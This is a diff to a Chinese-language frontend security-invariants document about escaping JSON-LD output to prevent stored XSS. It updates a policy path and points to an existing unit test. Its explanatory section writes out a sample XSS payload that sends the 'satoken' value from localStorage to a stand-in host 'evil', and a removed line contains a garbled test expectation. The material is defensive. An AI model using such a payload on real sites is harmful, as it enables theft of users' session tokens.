@@ -1,7 +1,7 @@
 # 前端安全不变量（Security Invariants）
 
 > 这是给维护者看的代码不变量清单。
-> 公开的 vulnerability disclosure policy 见 `frontend/SECURITY.md`。
+> 公开的 vulnerability disclosure policy 见 `SECURITY.md`。
 
 本文档登记前端代码中**不可变更的安全保护点**。
 每条不变量都对应一段 lint / 测试 / 代码模式，CI 应能捕获回归。
@@ -35,9 +35,9 @@
   - 暂时通过 grep 巡查兜底：
     `rg -t tsx -t ts 'dangerouslySetInnerHTML' app/ | grep -v safeJsonLdString | grep "application/ld\\+json"`
     应返回 0 行。建议未来加 ESLint 自定义规则。
-  - 推荐补一个单元测试：
-    `safeJsonLdString({bio: "</script><script>x</script>"})`
-    输出不能包含字面 `</script>`，必须含 `</script>`。
+  - 现有单元测试见：`tests/json-ld.test.ts`
+    例如 `safeJsonLdString({bio: "</script><script>x</script>"})`
+    输出不能包含字面 `<` 或 `</script>`，并且应包含转义后的 `\\u003c` 序列。
 - **为什么**：`JSON.stringify` 默认不转义 `<` `>` `&`，攻击者把
   `</script><script>fetch("https://evil/?t="+localStorage.getItem("satoken"))</script>`
   写进任何 user-generated 字段（profile bio、displayName 等）即触发 stored XSS。
